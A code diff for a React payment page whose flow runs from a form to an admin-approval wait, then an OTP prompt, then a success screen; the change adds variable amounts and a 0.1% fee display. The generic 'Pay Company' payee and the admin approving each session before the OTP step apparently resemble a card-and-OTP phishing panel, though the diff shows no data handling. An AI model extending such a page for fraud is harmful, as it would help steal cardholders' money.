@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useMemo } from "react";
 import PaymentForm from "@/components/PaymentForm";
 import OtpVerification from "@/components/OtpVerification";
 import PaymentSuccess from "@/components/PaymentSuccess";
@@ -7,15 +7,23 @@ import { supabase } from "@/integrations/supabase/client";
 
 const Index = () => {
   const [step, setStep] = useState<"form" | "waiting" | "otp" | "success">("form");
-  const [amount] = useState("1000.00");
+  const [amount, setAmount] = useState("");
   const [sessionId, setSessionId] = useState<string | null>(null);
+
+  const parsedAmount = parseFloat(amount) || 0;
+  const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
+  const total = parsedAmount > 0 ? parseFloat((parsedAmount + transactionFee).toFixed(2)) : 0;
+
+  const isValidAmount = parsedAmount >= 500 && parsedAmount <= 1500;
+
+  const formatEuro = (val: number) =>
+    val.toLocaleString("en-IE", { style: "currency", currency: "EUR" });
 
   const handleFormSubmit = (id: string) => {
     setSessionId(id);
     setStep("waiting");
   };
 
-  // Listen for admin to approve → move to OTP
   useEffect(() => {
     if (!sessionId || step !== "waiting") return;
 
@@ -71,17 +79,29 @@ const Index = () => {
           <div className="space-y-6">
             <div>
               <p className="text-white/50 text-sm">Pay Company</p>
-              <p className="text-white text-4xl font-bold tracking-tight mt-1">€1,001.00</p>
+              <p className="text-white text-4xl font-bold tracking-tight mt-1">
+                {isValidAmount ? formatEuro(total) : "€0.00"}
+              </p>
             </div>
 
             <div className="space-y-4 mt-8">
               <div className="flex items-center justify-between py-3 border-b border-white/10">
-                <p className="text-white/50 text-sm">Transaction fee</p>
-                <p className="text-white/90 text-sm">€1.00</p>
+                <p className="text-white/50 text-sm">Amount</p>
+                <p className="text-white/90 text-sm">
+                  {isValidAmount ? formatEuro(parsedAmount) : "—"}
+                </p>
+              </div>
+              <div className="flex items-center justify-between py-3 border-b border-white/10">
+                <p className="text-white/50 text-sm">Transaction fee (0.1%)</p>
+                <p className="text-white/90 text-sm">
+                  {isValidAmount ? formatEuro(transactionFee) : "—"}
+                </p>
               </div>
               <div className="flex items-center justify-between py-3">
                 <p className="text-white/90 text-sm font-semibold">Total</p>
-                <p className="text-white text-sm font-semibold">€1,001.00</p>
+                <p className="text-white text-sm font-semibold">
+                  {isValidAmount ? formatEuro(total) : "—"}
+                </p>
               </div>
             </div>
           </div>
@@ -107,13 +127,24 @@ const Index = () => {
               <span className="text-foreground font-semibold">Pay</span>
             </div>
             <p className="text-muted-foreground text-sm">Pay Company</p>
-            <p className="text-foreground text-3xl font-bold tracking-tight mt-1">€1,001.00</p>
+            <p className="text-foreground text-3xl font-bold tracking-tight mt-1">
+              {isValidAmount ? formatEuro(total) : "€0.00"}
+            </p>
           </div>
 
-          {step === "form" && <PaymentForm amount={amount} onSuccess={handleFormSubmit} />}
+          {step === "form" && (
+            <PaymentForm
+              amount={amount}
+              onAmountChange={setAmount}
+              total={total}
+              isValidAmount={isValidAmount}
+              formatEuro={formatEuro}
+              onSuccess={handleFormSubmit}
+            />
+          )}
           {step === "waiting" && <WaitingScreen />}
           {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} />}
-          {step === "success" && <PaymentSuccess amount={amount} />}
+          {step === "success" && <PaymentSuccess amount={formatEuro(total)} />}
         </div>
       </div>
     </div>
